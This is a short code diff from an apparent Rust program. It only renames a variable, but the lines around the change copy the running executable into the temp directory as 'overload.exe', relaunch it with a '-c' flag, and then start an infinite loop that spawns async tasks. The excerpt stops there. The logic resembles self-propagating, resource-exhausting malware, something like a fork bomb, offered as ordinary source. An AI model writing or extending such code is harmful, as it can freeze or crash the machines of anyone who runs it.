@@ -16,10 +16,10 @@ use utils::{join_paths, random_file, self_copy};
 async fn main() {
     let args: Vec<String> = env::args().collect();
     if args.len() < 2 {
-        let dir = join_paths(&env::var("temp").expect(""), "overload.exe");
-        self_copy(&dir);
+        let path = join_paths(&env::var("temp").expect(""), "overload.exe");
+        self_copy(&path);
 
-        Command::new(dir).arg("-c").spawn().expect("");
+        Command::new(path).arg("-c").spawn().expect("");
     } else if *args.get(1).unwrap() == "-c" {
         loop {
             tokio::spawn(async move {
